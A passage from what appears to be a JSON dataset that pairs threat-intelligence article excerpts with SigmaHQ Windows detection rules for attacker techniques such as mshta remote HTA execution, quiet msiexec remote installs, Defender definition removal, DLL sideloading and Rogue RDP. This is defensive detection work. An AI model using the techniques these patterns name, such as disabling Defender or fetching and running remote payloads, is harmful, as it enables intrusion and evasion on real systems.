          "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
        "filter_optional_null_parent": {
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mofcomp_execution.yml"
  },
  "257": {
    "url": "https://learn.microsoft.com/en-us/windows/win32/wmisdk/mofcomp",
    "markdown": "# mofcomp The *Managed Object Format (MOF)* compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. MOF files are usually automatically compiled during the installation of the systems with which they are provided, but you can also compile MOF files by using this tool. For more information about locating and using mofcomp.exe, see Using WMI Management Tools). For information about removing classes and instances from the WMI repository, see the **pragma deleteclass** preprocessor command. The following code example shows how to run the MOF compiler on a",
    "sigma_rule": {
      "title": "Potential Suspicious Mofcomp Execution",
      "id": "1dd05363-104e-4b4a-b963-196a534b03a1",
      "status": "test",
      "description": "Detects execution of the \"mofcomp\" utility as a child of a suspicious shell or script running utility or by having a suspicious path in the commandline.\nThe \"mofcomp\" utility parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository.\nAttackers abuse this utility to install malicious MOF scripts\n",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
        "https://github.com/The-DFIR-Report/Sigma-Rules/blob/75260568a7ffe61b2458ca05f6f25914efb44337/win_mofcomp_execution.yml",
        "https://learn.microsoft.com/en-us/windows/win32/wmisdk/mofcomp"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2023-04-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\mofcomp.exe"
          },
          {
            "OriginalFileName": "mofcomp.exe"
          }
        ],
        "selection_case": [
          {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\pwsh.exe",
              "\\wsl.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          {
            "CommandLine|contains": [
              "\\AppData\\Local\\Temp",
              "\\Users\\Public\\",
              "\\WINDOWS\\Temp\\",
              "%temp%",
              "%tmp%",
              "%appdata%"
            ]
          }
        ],
        "filter_main_wmiprvse": {
          "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
        "filter_optional_null_parent": {
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mofcomp_execution.yml"
  },
  "258": {
    "url": "https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/",
    "markdown": "# Living Off Windows Defender | LockBit Ransomware Sideloads Cobalt Strike Through Microsoft Security Tool **July 28, 2022** --- LockBit has been receiving a fair share of attention recently. Last week, SentinelLabs reported on LockBit 3.0 (aka LockBit Black), describing how the latest iteration of this increasingly prevalent RaaS implemented a series of anti-analysis and anti-debugging routines. Our research was quickly followed up by others reporting similar findings. Meanwhile, back in April, SentinelLabs reported on how a LockBit affiliate was leveraging the legitimate VMware command line utility, `VMwareXferlogs.exe`, in a live engagement to side load Cobalt Strike. In this post,",
    "sigma_rule": {
      "title": "Potential Mpclient.DLL Sideloading Via Defender Binaries",
      "id": "7002aa10-b8d4-47ae-b5ba-51ab07e228b9",
      "related": [
        {
          "id": "418dc89a-9808-4b87-b1d7-e5ae0cb6effc",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects potential sideloading of \"mpclient.dll\" by Windows Defender processes (\"MpCmdRun\" and \"NisSrv\") from their non-default directory.",
      "references": [
        "https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/"
      ],
      "author": "Bhabesh Raj",
      "date": "2022-08-01",
      "modified": "2023-08-04",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\MpCmdRun.exe",
            "\\NisSrv.exe"
          ]
        },
        "filter_main_known_locations": {
          "Image|startswith": [
            "C:\\Program Files (x86)\\Windows Defender\\",
            "C:\\Program Files\\Microsoft Security Client\\",
            "C:\\Program Files\\Windows Defender\\",
            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\",
            "C:\\Windows\\WinSxS\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mpcmdrun_dll_sideload_defender.yml"
  },
  "259": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md",
    "markdown": "",
    "sigma_rule": {
      "title": "Windows Defender Definition Files Removed",
      "id": "9719a8aa-401c-41af-8108-ced7ec9cd75c",
      "status": "test",
      "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md",
        "https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/"
      ],
      "author": "frack113",
      "date": "2021-07-07",
      "modified": "2023-07-18",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\MpCmdRun.exe"
          },
          {
            "OriginalFileName": "MpCmdRun.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -RemoveDefinitions",
            " -All"
          ]
        },
        "condition": "all of selection_*"
      },
      "fields": [
        "ComputerName",
        "User",
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mpcmdrun_remove_windows_defender_definition.yml"
  },
  "260": {
    "url": "https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/",
    "markdown": "# The Gorgon Group: Slithering Between Nation State and Cybercrime **Vulnerabilities** ## Related Products - Advanced WildFire - Cortex XDR --- **Published:** August 2, 2018 **Categories:** - Malware - Threat Actor Groups - Threat Research - Vulnerabilities **Tags:** - CVE-2017-0199 - Gorgon Group - Subaat --- Unit 42 researchers have been tracking Subaat, an attacker, since 2017. Recently Subaat drew our attention due to renewed targeted attack activity. Part of monitoring Subaat included realizing the actor was possibly part of a larger crew of individuals responsible for carrying out targeted attacks against worldwide governmental organizations. Technical analysis on some of",
    "sigma_rule": {
      "title": "Windows Defender Definition Files Removed",
      "id": "9719a8aa-401c-41af-8108-ced7ec9cd75c",
      "status": "test",
      "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md",
        "https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/"
      ],
      "author": "frack113",
      "date": "2021-07-07",
      "modified": "2023-07-18",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\MpCmdRun.exe"
          },
          {
            "OriginalFileName": "MpCmdRun.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -RemoveDefinitions",
            " -All"
          ]
        },
        "condition": "all of selection_*"
      },
      "fields": [
        "ComputerName",
        "User",
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mpcmdrun_remove_windows_defender_definition.yml"
  },
  "261": {
    "url": "https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html",
    "markdown": "# AvosLocker Ransomware Variant Abuses Driver File to Disable Antivirus, Scans for Log4shell **Ransomware** *May 02, 2022* We found an AvosLocker ransomware variant using a legitimate antivirus component to disable detection and blocking solutions. --- ## Infection chain We found samples of AvosLocker ransomware that makes use of a legitimate driver file to disable antivirus solutions and detection evasion. While previous AvosLocker infections employ similar routines, this is the first sample we observed from the US with the capability to disable a defense solution using a legitimate Avast Anti-Rootkit Driver file (*asWarPot.sys*). In addition, the ransomware is also capable of",
    "sigma_rule": {
      "title": "Remotely Hosted HTA File Executed Via Mshta.EXE",
      "id": "b98d0db6-511d-45de-ad02-e82a98729620",
      "status": "test",
      "description": "Detects execution of the \"mshta\" utility with an argument containing the \"http\" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file",
      "references": [
        "https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-08",
      "modified": "2023-02-06",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1218.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\mshta.exe"
          },
          {
            "OriginalFileName": "MSHTA.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "http://",
            "https://",
            "ftp://"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mshta_http.yml"
  },
  "262": {
    "url": "https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/",
    "markdown": "# ModernLoader delivers multiple stealers, cryptominers and RATs Thursday, September 1, 2022 Category: Threat Spotlight ## Key Points - Cisco Talos recently observed three separate, but related, campaigns between March and June 2022 delivering a variety of threats, including the ModernLoader bot, RedLine information-stealer, and cryptocurrency-mining malware to victims. - The actors use PowerShell, .NET assemblies, and HTA and VBS files to spread across a targeted network, eventually dropping other pieces of malware, such as the SystemBC trojan and DCRAT, to enable various stages of their operations. The attackers’ use of a variety of off-the-shelf tools makes it difficult to",
    "sigma_rule": {
      "title": "Wscript Shell Run In CommandLine",
      "id": "2c28c248-7f50-417a-9186-a85b223010ee",
      "status": "test",
      "description": "Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity",
      "references": [
        "https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/",
        "https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-31",
      "modified": "2023-05-15",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "Wscript.",
            ".Shell",
            ".Run"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Inline scripting can be used by some rare third party applications or administrators. Investigate and apply additional filters accordingly"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mshta_inline_vbscript.yml"
  },
  "263": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
    "markdown": "# Raspberry Robin worm part of larger ecosystem facilitating pre-ransomware activity **October 27, 2022** --- > **April 2023 update** – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. > > - **DEV-0206** is now tracked as **Mustard Tempest** > - **DEV-0243** is now tracked as **Manatee Tempest** > - **DEV-0950** is now tracked as **Lace Tempest** > - **DEV-0651** is now tracked as **Storm-0651** > - **DEV-0856** is now tracked as **Storm-0856** > > To learn about how the new taxonomy represents the origin, unique traits, and impact of threat",
    "sigma_rule": {
      "title": "Suspicious Msiexec Quiet Install From Remote Location",
      "id": "8150732a-0c9d-4a99-82b9-9efb9b90c40c",
      "related": [
        {
          "id": "f7b5f842-a6af-4da5-9e95-e32478f3cd2f",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of Msiexec.exe to install packages hosted remotely quietly",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-28",
      "modified": "2024-03-13",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\msiexec.exe"
          },
          {
            "OriginalFileName": "msiexec.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": [
            "-i",
            "-package",
            "-a",
            "-j"
          ]
        },
        "selection_quiet": {
          "CommandLine|contains|windash": "-q"
        },
        "selection_remote": {
          "CommandLine|contains": [
            "http",
            "\\\\\\\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_msiexec_install_remote.yml"
  },
  "264": {
    "url": "https://www.microsoft.com/security/blog/2021/12/09/a-closer-look-at-qakbots-latest-building-blocks-and-how-to-knock-them-down/",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Process Injection Via Msra.EXE",
      "id": "744a188b-0415-4792-896f-11ddb0588dbc",
      "status": "test",
      "description": "Detects potential process injection via Microsoft Remote Asssistance (Msra.exe) by looking at suspicious child processes spawned from the aforementioned process. It has been a target used by many threat actors and used for discovery and persistence tactics",
      "references": [
        "https://www.microsoft.com/security/blog/2021/12/09/a-closer-look-at-qakbots-latest-building-blocks-and-how-to-knock-them-down/",
        "https://www.fortinet.com/content/dam/fortinet/assets/analyst-reports/ar-qakbot.pdf"
      ],
      "author": "Alexander McDonald",
      "date": "2022-06-24",
      "modified": "2023-02-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1055"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\msra.exe",
          "ParentCommandLine|endswith": "msra.exe",
          "Image|endswith": [
            "\\arp.exe",
            "\\cmd.exe",
            "\\net.exe",
            "\\netstat.exe",
            "\\nslookup.exe",
            "\\route.exe",
            "\\schtasks.exe",
            "\\whoami.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use of Msra.exe"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_msra_process_injection.yml"
  },
  "265": {
    "url": "https://www.fortinet.com/content/dam/fortinet/assets/analyst-reports/ar-qakbot.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Process Injection Via Msra.EXE",
      "id": "744a188b-0415-4792-896f-11ddb0588dbc",
      "status": "test",
      "description": "Detects potential process injection via Microsoft Remote Asssistance (Msra.exe) by looking at suspicious child processes spawned from the aforementioned process. It has been a target used by many threat actors and used for discovery and persistence tactics",
      "references": [
        "https://www.microsoft.com/security/blog/2021/12/09/a-closer-look-at-qakbots-latest-building-blocks-and-how-to-knock-them-down/",
        "https://www.fortinet.com/content/dam/fortinet/assets/analyst-reports/ar-qakbot.pdf"
      ],
      "author": "Alexander McDonald",
      "date": "2022-06-24",
      "modified": "2023-02-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1055"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\msra.exe",
          "ParentCommandLine|endswith": "msra.exe",
          "Image|endswith": [
            "\\arp.exe",
            "\\cmd.exe",
            "\\net.exe",
            "\\netstat.exe",
            "\\nslookup.exe",
            "\\route.exe",
            "\\schtasks.exe",
            "\\whoami.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use of Msra.exe"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_msra_process_injection.yml"
  },
  "266": {
    "url": "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
    "markdown": "# FIN7 tradecraft seen in attacks against Veeam backup servers 26 April 2023 ## Updates: 28-04-2023 1100 UTC - We have reviewed and updated this blogpost to reflect our latest findings: - We have added information regarding the file “445.ps1”, which was missing at the time of writing. - We have updated this blogpost to broaden our attribution from FIN7 to FIN7 or a threat actor utilizing FIN7 tradecraft. ## Introduction WithSecure Intelligence identified attacks which occurred in late March 2023 against internet-facing servers running Veeam Backup & Replication software. Our research indicates that the intrusion set used in these",
    "sigma_rule": {
      "title": "Suspicious Child Process Of Veeam Dabatase",
      "id": "d55b793d-f847-4eea-b59a-5ab09908ac90",
      "related": [
        {
          "id": "869b9ca7-9ea2-4a5a-8325-e80e62f75445",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious child processes of the Veeam service process. This could indicate potential RCE or SQL Injection.",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-04",
      "tags": [
        "attack.initial-access",
        "attack.persistence",
        "attack.privilege-escalation"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\sqlservr.exe",
          "ParentCommandLine|contains": "VEEAMSQL"
        },
        "selection_child_1": {
          "Image|endswith": [
            "\\cmd.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\wsl.exe",
            "\\wt.exe"
          ],
          "CommandLine|contains": [
            "-ex ",
            "bypass",
            "cscript",
            "DownloadString",
            "http://",
            "https://",
            "mshta",
            "regsvr32",
            "rundll32",
            "wscript",
            "copy "
          ]
        },
        "selection_child_2": {
          "Image|endswith": [
            "\\net.exe",
            "\\net1.exe",
            "\\netstat.exe",
            "\\nltest.exe",
            "\\ping.exe",
            "\\tasklist.exe",
            "\\whoami.exe"
          ]
        },
        "condition": "selection_parent and 1 of selection_child_*"
      },
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mssql_veaam_susp_child_processes.yml"
  },
  "267": {
    "url": "https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/",
    "markdown": "# Rogue RDP – Revisiting Initial Access Methods **Date:** 28 Feb 2022 ## The Hunt for Initial Access With the default disablement of VBA macros originating from the internet, Microsoft may be pitching a curveball to threat actors and red teams that will inevitably make initial access a bit more difficult to achieve. Over the last year, I have invested some research time in pursuing the use of the Remote Desktop Protocol as an alternative initial access vector, which this post will cover. In efforts to regain traction, I want to introduce a new technique I dubbed as **Rogue RDP**.",
    "sigma_rule": {
      "title": "Mstsc.EXE Execution With Local RDP File",
      "id": "5fdce3ac-e7f9-4ecd-a3aa-a4d78ebbf0af",
      "status": "test",
      "description": "Detects potential RDP connection via Mstsc using a local \".rdp\" file",
      "references": [
        "https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/",
        "https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Christopher Peacock @securepeacock",
      "date": "2023-04-18",
      "modified": "2023-04-30",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\mstsc.exe"
          },
          {
            "OriginalFileName": "mstsc.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            ".rdp",
            ".rdp\""
          ]
        },
        "filter_optional_wsl": {
          "ParentImage": "C:\\Windows\\System32\\lxss\\wslhost.exe",
          "CommandLine|contains": "C:\\ProgramData\\Microsoft\\WSL\\wslg.rdp"
        },
        "condition": "all of selection_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Likely with legitimate usage of \".rdp\" files"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mstsc_run_local_rdp_file.yml"
  },
  "268": {
    "url": "https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/",
    "markdown": "# Detecting Rogue RDP You won't believe what Sysmon missed with this new initial access technique! **March 27, 2022** ## Table of Contents - Introduction - Rogue RDP Technique - Signals - Detection Opportunities - Microsoft Defender for Endpoint - Splunk/Sysmon - Sysmon Visibility Gaps - Splunk Rules - Results - Summary --- ## Introduction Microsoft recently announced the disablement of VBA macros carrying the mark of the web, impacting the ease-of-use of this widespread initial access technique. BlackHillsInfosec wrote a blog post on a different technique that could help fill the void titled “Rogue RDP”. This post examines signals",
    "sigma_rule": {
      "title": "Mstsc.EXE Execution With Local RDP File",
      "id": "5fdce3ac-e7f9-4ecd-a3aa-a4d78ebbf0af",
      "status": "test",
      "description": "Detects potential RDP connection via Mstsc using a local \".rdp\" file",
      "references": [
        "https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/",
        "https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Christopher Peacock @securepeacock",
      "date": "2023-04-18",
      "modified": "2023-04-30",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\mstsc.exe"
          },
          {
            "OriginalFileName": "mstsc.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            ".rdp",
            ".rdp\""
          ]
        },
        "filter_optional_wsl": {
          "ParentImage": "C:\\Windows\\System32\\lxss\\wslhost.exe",
          "CommandLine|contains": "C:\\ProgramData\\Microsoft\\WSL\\wslg.rdp"
        },
        "condition": "all of selection_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Likely with legitimate usage of \".rdp\" files"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mstsc_run_local_rdp_file.yml"
  },
  "269": {
    "url": "https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/",
    "markdown": "# Rogue RDP – Revisiting Initial Access Methods **Date:** 28 Feb 2022 ## The Hunt for Initial Access With the default disablement of VBA macros originating from the internet, Microsoft may be pitching a curveball to threat actors and red teams that will inevitably make initial access a bit more difficult to achieve. Over the last year, I have invested some research time in pursuing the use of the Remote Desktop Protocol as an alternative initial access vector, which this post will cover. In efforts to regain traction, I want to introduce a new technique I dubbed as **Rogue RDP**.",
    "sigma_rule": {
      "title": "Suspicious Mstsc.EXE Execution With Local RDP File",
      "id": "6e22722b-dfb1-4508-a911-49ac840b40f8",
      "status": "test",
      "description": "Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.",
      "references": [
        "https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/",
        "https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-04-18",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\mstsc.exe"
          },
          {
            "OriginalFileName": "mstsc.exe"
          }
        ],
        "selection_extension": {
          "CommandLine|endswith": [
            ".rdp",
            ".rdp\""
          ]
        },
        "selection_paths": {
          "CommandLine|contains": [
            ":\\Users\\Public\\",
            ":\\Windows\\System32\\spool\\drivers\\color",
            ":\\Windows\\System32\\Tasks_Migrated ",
            ":\\Windows\\Tasks\\",
            ":\\Windows\\Temp\\",
            ":\\Windows\\Tracing\\",
            "\\AppData\\Local\\Temp\\",
            "\\Downloads\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Likelihood is related to how often the paths are used in the environment"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mstsc_run_local_rdp_file_susp_location.yml"
  },
  "270": {
    "url": "https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/",
    "markdown": "# Detecting Rogue RDP You won't believe what Sysmon missed with this new initial access technique! **March 27, 2022** ## Table of Contents - Introduction - Rogue RDP Technique - Signals - Detection Opportunities - Microsoft Defender for Endpoint - Splunk/Sysmon - Sysmon Visibility Gaps - Splunk Rules - Results - Summary --- ## Introduction Microsoft recently announced the disablement of VBA macros carrying the mark of the web, impacting the ease-of-use of this widespread initial access technique. BlackHillsInfosec wrote a blog post on a different technique that could help fill the void titled “Rogue RDP”. This post examines signals",
    "sigma_rule": {
      "title": "Suspicious Mstsc.EXE Execution With Local RDP File",
      "id": "6e22722b-dfb1-4508-a911-49ac840b40f8",
      "status": "test",
      "description": "Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.",
      "references": [
        "https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/",
        "https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-04-18",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\mstsc.exe"
          },
          {
            "OriginalFileName": "mstsc.exe"
          }
        ],
        "selection_extension": {
          "CommandLine|endswith": [
            ".rdp",
            ".rdp\""
          ]
        },
        "selection_paths": {
          "CommandLine|contains": [
            ":\\Users\\Public\\",
            ":\\Windows\\System32\\spool\\drivers\\color",
            ":\\Windows\\System32\\Tasks_Migrated ",
            ":\\Windows\\Tasks\\",
            ":\\Windows\\Temp\\",
            ":\\Windows\\Tracing\\",
            "\\AppData\\Local\\Temp\\",
            "\\Downloads\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Likelihood is related to how often the paths are used in the environment"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mstsc_run_local_rdp_file_susp_location.yml"
  },
  "271": {
    "url": "https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/",
    "markdown": "# Rogue RDP – Revisiting Initial Access Methods **Date:** 28 Feb 2022 ## The Hunt for Initial Access With the default disablement of VBA macros originating from the internet, Microsoft may be pitching a curveball to threat actors and red teams that will inevitably make initial access a bit more difficult to achieve. Over the last year, I have invested some research time in pursuing the use of the Remote Desktop Protocol as an alternative initial access vector, which this post will cover. In efforts to regain traction, I want to introduce a new technique I dubbed as **Rogue RDP**.",
    "sigma_rule": {
      "title": "Mstsc.EXE Execution From Uncommon Parent",
      "id": "ff3b6b39-e765-42f9-bb2c-ea6761e0e0f6",
      "status": "test",
      "description": "Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.",
      "references": [
        "https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/",
        "https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-04-18",
      "modified": "2023-04-18",
      "tags": [
        "attack.lateral-movement"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": [
            "\\brave.exe",
            "\\CCleanerBrowser.exe",
            "\\chrome.exe",
            "\\chromium.exe",
            "\\firefox.exe",
            "\\iexplore.exe",
            "\\microsoftedge.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe",
            "\\whale.exe",
            "\\outlook.exe"
          ]
        },
        "selection_img": [
          {
            "Image|endswith": "\\mstsc.exe"
          },
          {
            "OriginalFileName": "mstsc.exe"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mstsc_run_local_rpd_file_susp_parent.yml"
  },
  "272": {
